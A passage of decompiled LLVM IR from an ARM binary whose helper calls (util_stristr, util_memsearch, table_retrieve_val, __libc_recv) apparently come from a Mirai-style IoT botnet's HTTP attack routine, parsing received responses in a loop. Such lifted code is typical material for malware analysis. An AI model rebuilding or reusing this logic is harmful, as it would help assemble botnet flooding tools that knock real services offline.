  %v3_97c8 = inttoptr i32 %v2_97c8 to i8*
  %v4_97c8 = load i8, i8* %v3_97c8, align 1
  %v6_97c8 = zext i8 %v4_97c8 to i32
  store i32 %v6_97c8, i32* %r0.global-to-local, align 4
  %v1_97cc = add nsw i32 %v6_97c8, -48
  store i32 %v1_97cc, i32* %r3.global-to-local, align 4
  %v2_97d0 = icmp ugt i32 %v1_97cc, 8
  store i1 %v2_97d0, i1* %cpsr_c.global-to-local, align 1
  %v7_97d0 = icmp eq i32 %v1_97cc, 9
  store i1 %v7_97d0, i1* %cpsr_z.global-to-local, align 1
  %v2_97d4 = xor i1 %v7_97d0, true
  %v3_97d4 = and i1 %v2_97d0, %v2_97d4
  br i1 %v3_97d4, label %.thread113, label %dec_label_pc_97dc

.thread113:                                       ; preds = %bb203
  %v4_97d4 = load i32, i32* @r5, align 4
  store i32 %v4_97d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97dc:                                ; preds = %bb203
  %v1_97e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97e0, %dec_label_pc_97dc
  %v0_97f8 = phi i32 [ %v1_97f8, %dec_label_pc_97e0 ], [ 1, %dec_label_pc_97dc ]
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v0_97f8, i32* %stack_var_-44, align 4
  %v2_97e8 = add i32 %v0_97f8, %v1_97e8.pre
  %v3_97e8 = inttoptr i32 %v2_97e8 to i8*
  %v4_97e8 = load i8, i8* %v3_97e8, align 1
  %v6_97e8 = zext i8 %v4_97e8 to i32
  store i32 %v6_97e8, i32* %r0.global-to-local, align 4
  %v1_97ec = add nsw i32 %v6_97e8, -48
  store i32 %v1_97ec, i32* %r3.global-to-local, align 4
  store i32 %v0_97f8, i32* %ip.global-to-local, align 4
  %v2_97f4 = icmp ugt i32 %v1_97ec, 8
  store i1 %v2_97f4, i1* %cpsr_c.global-to-local, align 1
  %v7_97f4 = icmp eq i32 %v1_97ec, 9
  store i1 %v7_97f4, i1* %cpsr_z.global-to-local, align 1
  %v1_97f8 = add i32 %v0_97f8, 1
  store i32 %v1_97f8, i32* @lr, align 4
  store i32 %v2_97e8, i32* %r1.global-to-local, align 4
  %v2_9800 = xor i1 %v2_97f4, true
  %v3_9800 = or i1 %v7_97f4, %v2_9800
  br i1 %v3_9800, label %dec_label_pc_97e0, label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97e0, %.thread113
  %v2_9810 = phi i32 [ %v4_97d4, %.thread113 ], [ %v2_97e8, %dec_label_pc_97e0 ]
  %v0_9804 = phi i32 [ %v6_97c8, %.thread113 ], [ %v6_97e8, %dec_label_pc_97e0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9804 = icmp eq i32 %v0_9804, 0
  store i1 %v2_9804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9804, label %dec_label_pc_9938, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_9804
  store i32 0, i32* @r6, align 4
  %v3_9810 = inttoptr i32 %v2_9810 to i8*
  store i8 0, i8* %v3_9810, align 1
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9818 = load i32, i32* %stack_var_-44, align 4
  %v1_981c = add i32 %v3_9818, 1
  store i32 %v1_981c, i32* %ip.global-to-local, align 4
  store i32 %v1_981c, i32* %stack_var_-44, align 4
  %v0_9824 = load i32, i32* @r5, align 4
  %v2_9824 = add i32 %v0_9824, %v1_981c
  %v3_9824 = inttoptr i32 %v2_9824 to i8*
  %v4_9824 = load i8, i8* %v3_9824, align 1
  %v6_9824 = zext i8 %v4_9824 to i32
  store i32 %v6_9824, i32* %r3.global-to-local, align 4
  %v2_9828 = icmp ugt i8 %v4_9824, 31
  store i1 %v2_9828, i1* %cpsr_c.global-to-local, align 1
  %v7_9828 = icmp eq i8 %v4_9824, 32
  store i1 %v7_9828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9828, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_980c
  store i32 %v2_9824, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_980c
  %v2_982c = add i32 %v3_9818, 2
  store i32 %v2_982c, i32* %ip.global-to-local, align 4
  %v2_9830 = add i32 %v0_9824, %v2_982c
  store i32 %v2_9830, i32* @r4, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_982c, i32* %v11_82f4, align 4
  %v0_983c.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_983c = phi i32 [ %v2_9824, %bb204 ], [ %v0_983c.pre, %bb205 ]
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  %v1_9840 = inttoptr i32 %v0_983c to i8*
  %v2_9840 = call i32 @util_strlen(i8* %v1_9840)
  store i32 ptrtoint ([5 x i8]* @global_var_1b394.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9840, i32* @r1, align 4
  %v0_984c = load i32, i32* @r4, align 4
  store i32 %v0_984c, i32* %r0.global-to-local, align 4
  %v3_9850 = inttoptr i32 %v0_984c to i8*
  %v4_9850 = call i32 @util_stristr(i8* %v3_9850, i32 %v2_9840, i32 ptrtoint ([5 x i8]* @global_var_1b394.55 to i32))
  store i32 %v4_9850, i32* %r0.global-to-local, align 4
  %v2_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v2_9854, i1* %cpsr_c.global-to-local, align 1
  %v7_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v7_9854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9854, label %.thread38, label %dec_label_pc_9864

.thread38:                                        ; preds = %.thread37
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v4_985c = load i32, i32* %v11_82f4, align 4
  store i32 %v4_985c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9898

dec_label_pc_9864:                                ; preds = %.thread37
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9868 = load i32, i32* %stack_var_-44, align 4
  %v0_986c = load i32, i32* @r5, align 4
  %v2_986c = add i32 %v0_986c, %v3_9868
  store i32 %v2_986c, i32* @r4, align 4
  store i32 %v2_986c, i32* %r0.global-to-local, align 4
  %v1_9874 = inttoptr i32 %v2_986c to i8*
  %v2_9874 = call i32 @util_strlen(i8* %v1_9874)
  store i32 ptrtoint ([5 x i8]* @global_var_1b394.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9874, i32* @r1, align 4
  %v0_9880 = load i32, i32* @r4, align 4
  store i32 %v0_9880, i32* %r0.global-to-local, align 4
  %v4_9884 = inttoptr i32 %v0_9880 to i8*
  %v5_9884 = call i32 @util_stristr(i8* %v4_9884, i32 %v2_9874, i32 ptrtoint ([5 x i8]* @global_var_1b394.55 to i32))
  store i32 %v5_9884, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_988c = load i32, i32* %stack_var_-44, align 4
  %v2_9890 = add i32 %v3_988c, %v5_9884
  store i32 %v2_9890, i32* %ip.global-to-local, align 4
  store i32 %v2_9890, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %.thread38, %dec_label_pc_9864
  %v0_9d74 = phi i32 [ %v4_985c, %.thread38 ], [ %v2_9890, %dec_label_pc_9864 ]
  %v0_9898 = load i32, i32* @r5, align 4
  %v2_9898 = add i32 %v0_9898, %v0_9d74
  %v3_9898 = inttoptr i32 %v2_9898 to i8*
  %v4_9898 = load i8, i8* %v3_9898, align 1
  %v6_9898 = zext i8 %v4_9898 to i32
  store i32 %v6_9898, i32* %r3.global-to-local, align 4
  %v2_989c = icmp ugt i8 %v4_9898, 33
  store i1 %v2_989c, i1* %cpsr_c.global-to-local, align 1
  %v7_989c = icmp eq i8 %v4_9898, 34
  store i1 %v7_989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_989c, label %dec_label_pc_9d74, label %dec_label_pc_98a4

dec_label_pc_98a4:                                ; preds = %dec_label_pc_9d74, %dec_label_pc_9898, %dec_label_pc_9d9c
  %v0_98a4 = load i32, i32* @r5, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98ac = inttoptr i32 %v0_98a4 to i8*
  %v3_98ac = call i32 @util_atoi(i8* %v2_98ac, i32 10)
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = add i32 %v3_98ac, -1
  store i32 %v1_98b0, i32* %r3.global-to-local, align 4
  %v2_98b4 = icmp ugt i32 %v1_98b0, 7
  store i1 %v2_98b4, i1* %cpsr_c.global-to-local, align 1
  %v7_98b4 = icmp eq i32 %v1_98b0, 8
  store i1 %v7_98b4, i1* %cpsr_z.global-to-local, align 1
  %v2_98b8 = xor i1 %v2_98b4, true
  %v3_98b8 = or i1 %v7_98b4, %v2_98b8
  br i1 %v3_98b8, label %dec_label_pc_98cc.preheader, label %dec_label_pc_98e0

dec_label_pc_98cc.preheader:                      ; preds = %dec_label_pc_98a4
  store i32 %v2_879c, i32* %r2.global-to-local, align 4
  %v6_98bc = add i32 %v3_98ac, %v2_879c
  store i32 %v6_98bc, i32* @r4, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98cc
  %v1_98c8 = call i32 @sleep(i32 1)
  store i32 %v1_98c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98cc.preheader, %dec_label_pc_98c8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @__GI_time(i32* null)
  %v0_98d4 = load i32, i32* @r4, align 4
  %v3_98d4 = icmp uge i32 %v0_98d4, %v2_98d0
  store i1 %v3_98d4, i1* %cpsr_c.global-to-local, align 1
  %v9_98d4 = icmp eq i32 %v0_98d4, %v2_98d0
  store i1 %v9_98d4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98dc = xor i1 %v9_98d4, true
  %v3_98dc = and i1 %v3_98d4, %v2_98dc
  br i1 %v3_98dc, label %dec_label_pc_98c8, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98a4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_98e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98e4, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  %v2_98e8 = add i32 %v0_98e8, %v3_98e4
  store i32 %v2_98e8, i32* @r6, align 4
  store i32 %v2_98e8, i32* %r0.global-to-local, align 4
  %v1_98f0 = inttoptr i32 %v2_98e8 to i8*
  %v2_98f0 = call i32 @util_strlen(i8* %v1_98f0)
  store i32 ptrtoint ([5 x i8]* @global_var_1b38c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f0, i32* @r1, align 4
  %v0_98fc = load i32, i32* @r6, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v4_9900 = inttoptr i32 %v0_98fc to i8*
  %v5_9900 = call i32 @util_stristr(i8* %v4_9900, i32 %v2_98f0, i32 ptrtoint ([5 x i8]* @global_var_1b38c.53 to i32))
  store i32 %v5_9900, i32* %r0.global-to-local, align 4
  %v2_9904 = icmp ugt i32 %v5_9900, 3
  store i1 %v2_9904, i1* %cpsr_c.global-to-local, align 1
  %v7_9904 = icmp eq i32 %v5_9900, 4
  store i1 %v7_9904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9904, label %dec_label_pc_9c60, label %dec_label_pc_990c

dec_label_pc_990c:                                ; preds = %dec_label_pc_98e0
  %v0_990c = load i32, i32* @r5, align 4
  %v1_990c = load i32, i32* @r4, align 4
  %v2_990c = add i32 %v1_990c, %v0_990c
  %v3_990c = inttoptr i32 %v2_990c to i8*
  %v4_990c = load i8, i8* %v3_990c, align 1
  %v6_990c = zext i8 %v4_990c to i32
  store i32 %v6_990c, i32* @r3, align 4
  %v2_9910 = icmp ugt i8 %v4_990c, 46
  store i1 %v2_9910, i1* %cpsr_c.global-to-local, align 1
  %v7_9910 = icmp eq i8 %v4_990c, 47
  store i1 %v7_9910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9910, label %dec_label_pc_9dbc, label %dec_label_pc_9918

dec_label_pc_9918:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9dbc, %dec_label_pc_9d24, %dec_label_pc_9d08, %dec_label_pc_990c, %dec_label_pc_9e04, %dec_label_pc_9d50
  %v0_9918 = load i32, i32* %sb.global-to-local, align 4
  %v1_991c = add i32 %v0_9918, 1431
  store i32 %v1_991c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_9928 = call i32 @memcpy()
  store i32 %v0_9928, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 10, i8* %v4_9930, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9938:                                ; preds = %dec_label_pc_9804, %dec_label_pc_9744, %dec_label_pc_9718
  %v0_9938 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9938, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9948 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9938, i32 ptrtoint ([5 x i8]* @global_var_1b380.51 to i32), i32 4)
  %v0_994c = load i32, i32* %sb.global-to-local, align 4
  %v1_9950 = add i32 %v0_994c, 1431
  store i32 %v1_9950, i32* @r4, align 4
  store i32 %v5_9948, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b39c.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9950, i32* %r0.global-to-local, align 4
  %v3_9960 = inttoptr i32 %v1_9950 to i8*
  %v4_9960 = call i32 @util_strcmp(i8* %v3_9960, i32 ptrtoint ([5 x i8]* @global_var_1b39c.57 to i32))
  store i32 %v4_9960, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9964 = icmp eq i32 %v4_9960, 0
  store i1 %v2_9964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9964, label %dec_label_pc_9b14, label %dec_label_pc_996c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9b14, %dec_label_pc_9938
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9970 = load i32, i32* @sl, align 4
  %v3_9970 = add i32 %v2_9970, -1448
  %v4_9970 = inttoptr i32 %v3_9970 to i8*
  store i8 7, i8* %v4_9970, align 1
  br label %dec_label_pc_9974

dec_label_pc_9974:                                ; preds = %bb211, %dec_label_pc_996c
  %v0_9974 = load i32, i32* @r5, align 4
  store i32 %v0_9974, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @sl, align 4
  %v1_9978 = add i32 %v0_9978, -1452
  %v2_9978 = inttoptr i32 %v1_9978 to i32*
  %v3_9978 = load i32, i32* %v2_9978, align 4
  store i32 %v3_9978, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9984 = call i32 @__libc_recv(i32 %v3_9978, i32 %v2_827c, i32 %v0_9974, i32 16384)
  store i32 %v4_9984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ec

dec_label_pc_998c:                                ; preds = %dec_label_pc_8e94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v0_9994 = load i32, i32* @sl, align 4
  %v1_9994 = add i32 %v0_9994, 660
  %v2_9994 = inttoptr i32 %v1_9994 to i32*
  %v3_9994 = load i32, i32* %v2_9994, align 4
  store i32 %v3_9994, i32* @r4, align 4
  %v3_9998 = call i32 @table_retrieve_val(i32 39, i32* null)
  %v0_999c = load i32, i32* @r4, align 4
  store i32 %v0_999c, i32* %r1.global-to-local, align 4
  store i32 %v3_9998, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r7, align 4
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v4_99ac = call i32 @util_memsearch(i32 %v0_99a8, i32 %v0_999c, i32 %v3_9998, i32 11)
  store i32 %v4_99ac, i32* %r0.global-to-local, align 4
  %v0_99b0 = load i32, i32* @sl, align 4
  %v1_99b0 = add i32 %v0_99b0, 660
  %v2_99b0 = inttoptr i32 %v1_99b0 to i32*
  %v3_99b0 = load i32, i32* %v2_99b0, align 4
  %v0_99b4 = load i32, i32* @r7, align 4
  %v2_99b4 = add i32 %v0_99b4, %v4_99ac
  store i32 %v2_99b4, i32* @r6, align 4
  store i32 %v4_99ac, i32* @r4, align 4
  %v2_99bc = sub i32 %v3_99b0, %v4_99ac
  store i32 %v2_99bc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3a4.59 to i32), i32* %r2.global-to-local, align 4
  %v0_99c4 = load i32, i32* @r8, align 4
  store i32 %v0_99c4, i32* %r3.global-to-local, align 4
  store i32 %v2_99b4, i32* %r0.global-to-local, align 4
  %v4_99cc = call i32 @util_memsearch(i32 %v2_99b4, i32 %v2_99bc, i32 ptrtoint (i32* @global_var_1b3a4.59 to i32), i32 %v0_99c4)
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  %v0_99d0 = load i32, i32* @sl, align 4
  %v1_99d0 = add i32 %v0_99d0, 16
  %v2_99d0 = inttoptr i32 %v1_99d0 to i32*
  %v3_99d0 = load i32, i32* %v2_99d0, align 4
  store i32 %v3_99d0, i32* %r3.global-to-local, align 4
  %v1_99d4 = load i32, i32* @r4, align 4
  %v2_99d4 = add i32 %v1_99d4, %v4_99cc
  store i32 %v2_99d4, i32* @r5, align 4
  %v0_99d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_99d8 = add i32 %v0_99d8, %v2_99d4
  store i32 %v2_99d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99e0 = icmp ugt i32 %v3_99d0, 3
  store i1 %v2_99e0, i1* %cpsr_c.global-to-local, align 1
  %v7_99e0 = icmp eq i32 %v3_99d0, 4
  store i1 %v7_99e0, i1* %cpsr_z.global-to-local, align 1
  %v3_99e4 = add i32 %v2_99d8, 2115
  %v4_99e4 = inttoptr i32 %v3_99e4 to i8*
  store i8 0, i8* %v4_99e4, align 1
  %v7_99e8 = icmp sgt i32 %v3_99d0, 4
  br i1 %v7_99e8, label %dec_label_pc_99ec, label %dec_label_pc_9b54

dec_label_pc_99ec:                                ; preds = %dec_label_pc_998c, %dec_label_pc_9b54, %dec_label_pc_9b64
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99f4 = load i32, i32* @sl, align 4
  %v2_99f4 = add i32 %v1_99f4, 12
  %v3_99f4 = inttoptr i32 %v2_99f4 to i32*
  store i32 -1, i32* %v3_99f4, align 4
  %v0_99f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99f8 = trunc i32 %v0_99f8 to i8
  %v2_99f8 = load i32, i32* @sl, align 4
  %v3_99f8 = add i32 %v2_99f8, -1448
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 %v1_99f8, i8* %v4_99f8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9a00:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9a0c = load i32, i32* @r6, align 4
  %v1_9a0c = add i32 %v0_9a0c, 4
  %v2_9a0c = inttoptr i32 %v1_9a0c to i8*
  %v3_9a0c = load i8, i8* %v2_9a0c, align 1
  %v4_9a0c = zext i8 %v3_9a0c to i32
  store i32 %v4_9a0c, i32* @r3, align 4
  %v2_9a10 = icmp ugt i8 %v3_9a0c, 114
  store i1 %v2_9a10, i1* %cpsr_c.global-to-local, align 1
  %v7_9a10 = icmp eq i8 %v3_9a0c, 115
  store i1 %v7_9a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a10, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_9a00
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_9a00, %bb206
  %v3_9a20 = phi i32 [ 7, %dec_label_pc_9a00 ], [ 8, %bb206 ]
  store i32 %v0_9a0c, i32* @r0, align 4
  %v1_9a28 = load i32, i32* @r5, align 4
  %v2_9a28 = sub i32 %v1_9a28, %v3_9a20
  store i32 %v2_9a28, i32* @r2, align 4
  %v2_9a2c = add i32 %v3_9a20, %v0_9a0c
  store i32 %v2_9a2c, i32* @r1, align 4
  %v3_9a30 = call i32 @memmove(i32 %v0_9a0c, i32 %v2_9a2c, i32 %v2_9a28)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r7, align 4
  store i32 %v0_9a38, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_9a40 = load i32, i32* @r4, align 4
  %v2_9a40 = add i32 %v1_9a40, %v2_827c
  %v3_9a40 = inttoptr i32 %v2_9a40 to i8*
  %v4_9a40 = load i8, i8* %v3_9a40, align 1
  %v6_9a40 = zext i8 %v4_9a40 to i32
  store i32 %v6_9a40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a44 = icmp eq i8 %v4_9a40, 0
  store i1 %v2_9a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a44, label %dec_label_pc_9a88, label %dec_label_pc_9a4c

dec_label_pc_9a4c:                                ; preds = %.thread41
  %v2_9a4c = icmp ugt i8 %v4_9a40, 46
  store i1 %v2_9a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a4c = icmp eq i8 %v4_9a40, 47
  store i1 %v7_9a4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a50 = load i32, i32* @r6, align 4
  br i1 %v7_9a4c, label %bb207, label %dec_label_pc_9a58

bb207:                                            ; preds = %dec_label_pc_9a4c
  store i32 %v1_9a50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a4c
  store i32 %v0_9a38, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a68

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a68
  %v2_9a60 = icmp ugt i8 %v4_9a74, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a74, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a60, label %dec_label_pc_9b48, label %dec_label_pc_9a68

dec_label_pc_9a68:                                ; preds = %dec_label_pc_9a60, %dec_label_pc_9a58
  %v0_9a68 = phi i32 [ %v1_9a68, %dec_label_pc_9a60 ], [ %v0_9a38, %dec_label_pc_9a58 ]
  %v1_9a68 = add i32 %v0_9a68, 1
  store i32 %v1_9a68, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_9a68, i32* %stack_var_-44, align 4
  %v2_9a74 = add i32 %v1_9a68, %v1_9a50
  %v3_9a74 = inttoptr i32 %v2_9a74 to i8*
  %v4_9a74 = load i8, i8* %v3_9a74, align 1
  %v6_9a74 = zext i8 %v4_9a74 to i32
  store i32 %v6_9a74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a78 = icmp eq i8 %v4_9a74, 0
  store i1 %v2_9a78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a68, i32* %r1.global-to-local, align 4
  store i32 %v2_9a74, i32* %r2.global-to-local, align 4
  br i1 %v2_9a78, label %dec_label_pc_9a88, label %dec_label_pc_9a60

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a68, %.thread41, %dec_label_pc_9b48
  %v0_9a88 = load i32, i32* @r6, align 4
  store i32 %v0_9a88, i32* %r0.global-to-local, align 4
  %v1_9a8c = inttoptr i32 %v0_9a88 to i8*
  %v2_9a8c = call i32 @util_strlen(i8* %v1_9a8c)
  store i32 %v2_9a8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a90 = icmp eq i32 %v2_9a8c, 0
  store i1 %v2_9a90, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_9a8c, 1
  br i1 %tmp208, label %dec_label_pc_9ab4, label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a88
  %v0_9a98 = load i32, i32* @r6, align 4
  store i32 %v0_9a98, i32* %r0.global-to-local, align 4
  %v1_9a9c = inttoptr i32 %v0_9a98 to i8*
  %v2_9a9c = call i32 @util_strlen(i8* %v1_9a9c)
  store i32 %v2_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = add i32 %v2_9a9c, -127
  %v2_9aa0 = icmp ugt i32 %v2_9a9c, 126
  store i1 %v2_9aa0, i1* %cpsr_c.global-to-local, align 1
  %v3_9aa0 = sub i32 126, %v2_9a9c
  %v4_9aa0 = and i32 %v3_9aa0, %v2_9a9c
  %v5_9aa0 = icmp slt i32 %v4_9aa0, 0
  %v6_9aa0 = icmp slt i32 %v1_9aa0, 0
  %v7_9aa0 = icmp eq i32 %v2_9a9c, 127
  store i1 %v7_9aa0, i1* %cpsr_z.global-to-local, align 1
  %v7_9aa4 = icmp sgt i32 %v2_9a9c, 127
  br i1 %v7_9aa4, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_9a98
  %v8_9aa4 = load i32, i32* %sb.global-to-local, align 4
  %v9_9aa8 = add i32 %v8_9aa4, 789
  store i32 %v9_9aa8, i32* %r0.global-to-local, align 4
  %v8_9aac = load i32, i32* @r6, align 4
  store i32 %v8_9aac, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9a98, %bb209
  store i32 39604, i32* @lr, align 4
  %v3_9ab0 = xor i1 %v6_9aa0, %v5_9aa0
  %v4_9ab0 = or i1 %v7_9aa0, %v3_9ab0
  call void @__pseudo_cond_branch(i1 %v4_9ab0, i32 ptrtoint (i32* @global_var_124b8.60 to i32))
  br label %dec_label_pc_9ab4

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9a88, %.thread44
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9ab8 = load i32, i32* %stack_var_-44, align 4
  %v0_9abc = load i32, i32* @r6, align 4
  %v1_9abc = add i32 %v0_9abc, 1
  store i32 %v1_9abc, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9abc, %v3_9ab8
  store i32 %v2_9ac0, i32* %r0.global-to-local, align 4
  %v1_9ac4 = inttoptr i32 %v2_9ac0 to i8*
  %v2_9ac4 = call i32 @util_strlen(i8* %v1_9ac4)
  store i32 %v2_9ac4, i32* %r0.global-to-local, align 4
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 254
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 255
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v8_9acc = icmp sgt i32 %v2_9ac4, 255
  br i1 %v8_9acc, label %dec_label_pc_9654, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ab4
  %v0_9ad0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ad4 = add i32 %v0_9ad0, 533
  store i32 %v1_9ad4, i32* @r4, align 4
  store i32 %v1_9ad4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ae0 = call i32 @util_zero(i32 %v1_9ad4, i32 255)
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9ae8 = load i32, i32* %stack_var_-44, align 4
  %v0_9aec = load i32, i32* @r5, align 4
  %v2_9aec = add i32 %v0_9aec, %v3_9ae8
  store i32 %v2_9aec, i32* %r0.global-to-local, align 4
  %v1_9af0 = inttoptr i32 %v2_9aec to i8*
  %v2_9af0 = call i32 @util_strlen(i8* %v1_9af0)
  store i32 %v2_9af0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9af4 = icmp eq i32 %v2_9af0, 0
  store i1 %v2_9af4, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_9af0, 1
  br i1 %tmp210, label %dec_label_pc_9654, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ad0
  %v3_9b00 = load i32, i32* %stack_var_-44, align 4
  %v0_9b04 = load i32, i32* @r4, align 4
  store i32 %v0_9b04, i32* @r0, align 4
  %v0_9b08 = load i32, i32* @r5, align 4
  %v2_9b08 = add i32 %v0_9b08, %v3_9b00
